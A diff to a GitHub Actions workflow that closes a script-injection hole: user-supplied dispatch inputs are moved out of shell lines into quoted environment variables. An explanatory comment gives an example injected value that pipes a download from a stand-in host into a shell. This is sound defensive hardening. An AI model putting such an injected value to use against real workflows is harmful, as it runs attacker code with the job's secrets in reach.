@@ -62,9 +62,15 @@ jobs:
 
       - run: pip install -r requirements.txt
 
+      # A dispatch input is attacker-controllable text. Interpolated straight
+      # into `run:` it is pasted into the shell script BEFORE the shell sees
+      # it, so `daily; curl evil.sh | sh` executes as two commands with the
+      # job's secrets in scope. Passed through `env:` the value is data the
+      # shell reads from the environment, and quoting it keeps it one argument.
       - name: Collect
-        run: python -m src.cli collect ${{ inputs.tier || 'daily' }}
+        run: python -m src.cli collect "$TIER"
         env:
+          TIER: ${{ inputs.tier || 'daily' }}
           TURSO_DATABASE_URL: ${{ secrets.TURSO_DATABASE_URL }}
           TURSO_AUTH_TOKEN: ${{ secrets.TURSO_AUTH_TOKEN }}
           COINGECKO_API_KEY: ${{ secrets.COINGECKO_API_KEY }}
@@ -75,8 +81,9 @@ jobs:
 
       - name: Record trigger lag
         if: always() && inputs.scheduled_for != ''
-        run: python -m src.ops.record_lag --workflow collect-daily --scheduled "${{ inputs.scheduled_for }}"
+        run: python -m src.ops.record_lag --workflow collect-daily --scheduled "$SCHEDULED_FOR"
         env:
+          SCHEDULED_FOR: ${{ inputs.scheduled_for }}
           TURSO_DATABASE_URL: ${{ secrets.TURSO_DATABASE_URL }}
           TURSO_AUTH_TOKEN: ${{ secrets.TURSO_AUTH_TOKEN }}
 
